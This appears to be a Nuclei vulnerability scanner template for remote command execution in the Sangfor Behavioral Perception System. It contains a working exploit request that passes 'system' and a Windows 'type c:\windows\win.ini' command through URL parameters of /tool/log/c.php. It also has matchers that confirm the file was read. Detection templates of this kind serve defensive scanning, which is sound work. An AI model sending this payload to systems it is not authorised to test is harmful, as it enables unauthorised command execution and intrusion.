id: sangfor-behavioral-perception-system-c-php-rce
info:
  name: Sangfor Behavioral Perception System c.php Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=system&host=type%20c:\\windows\\win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[files]"
          - "bit app support"
          - "Host"
          - "Log Helper"
